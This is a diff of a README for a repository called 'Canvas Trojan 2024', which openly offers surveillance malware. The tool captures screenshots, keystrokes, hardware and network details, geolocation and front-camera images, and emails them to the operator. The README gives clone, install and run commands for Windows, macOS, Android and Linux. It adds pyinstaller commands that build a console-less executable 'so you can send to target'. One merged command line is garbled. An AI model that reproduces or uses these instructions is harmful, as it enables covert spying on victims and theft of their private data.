@@ -1,6 +1,6 @@
-Trojan 2024: A Multi-Platform Information Gathering Script
-Welcome!
-This repository provides a script capable of collecting various data from devices, such as:
+Canvas Trojan 2024: A Multi-Platform Information Gathering Script .
+
+Features :
 
 Screenshots
 Keystrokes
@@ -9,6 +9,7 @@ Geolocation data
 Front camera captures
 All data is securely delivered via email for your convenience.
 
+
 Key Features
 Screenshot Capture: Automatically captures desktop activity every 60 seconds.
 Keylogging: Records typed text at configurable intervals.
@@ -16,90 +17,64 @@ Hardware Information: Retrieves details like CPU, GPU, and RAM specs.
 Network Data: Captures IP addresses, MAC addresses, and more.
 Geolocation Tracking: Provides approximate location details.
 Camera Access: Takes images using the front camera (if available).
+
+
 Installation and Setup
 Windows
 Open PowerShell or Command Prompt.
-Clone this repository:
-bash
-Copy code
 git clone https://github.com/BlackNode-stack/2024Trojan.git
 cd 2024Trojan
-Install required dependencies:
-bash
-Copy code
 pip install -r requirements.txt
-Run the script:
-bash
-Copy code
 python Run.py
-(Optional) Generate a standalone executable:
-bash
-Copy code
+
+Generate a standalone executable so you can send to target .
+
 pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
-The executable will be located in the dist folder.
+
+
+
 macOS
 Open the Terminal.
-Clone this repository:
-bash
-Copy code
+Clone this repository
 git clone https://github.com/BlackNode-stack/2024Trojan.git
 cd 2024Trojan
-Install required dependencies:
-bash
-Copy code
 python3 -m pip install -r requirements.txt
-Run the script:
-bash
-Copy code
 python3 Run.py
-(Optional) Generate a standalone executable:
-bash
-Copy code
+
+
+Generate a standalone executable so you can send to target .
+
 pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
-The executable will be located in the dist folder.
+
+
 Termux (Android)
 Install Termux from F-Droid or the Google Play Store.
-Update packages:
-bash
-Copy code
+Update packages
 pkg update && pkg upgrade
-Install required tools:
-bash
-Copy code
 pkg install git python
-Clone this repository:
-bash
-Copy code
 git clone https://github.com/BlackNode-stack/2024Trojan.git
-cd 2024Trojan
-Install dependencies:
-bash
-Copy code
-pip install -r requirements.txt
-Run the script:
-bash
-Copy code
+cd 2024Trojanpip install -r requirements.txt
 python Run.py
+
+Generate a standalone executable so you can send to target .
+
+pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
+
+
 Linux
 Open the Terminal.
-Clone this repository:
-bash
-Copy code
+Clone this repository
 git clone https://github.com/BlackNode-stack/2024Trojan.git
 cd 2024Trojan
-Install required dependencies:
-bash
-Copy code
 python3 -m pip install -r requirements.txt
-Run the script:
-bash
-Copy code
 python3 Run.py
-(Optional) Generate a standalone executable:
-bash
-Copy code
+
+
+Generate a standalone executable so you can send to target .
+
 pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
-The executable will be located in the dist folder.
+
+
 Usage Instructions
 Email Configuration
 During setup, you’ll need to provide:
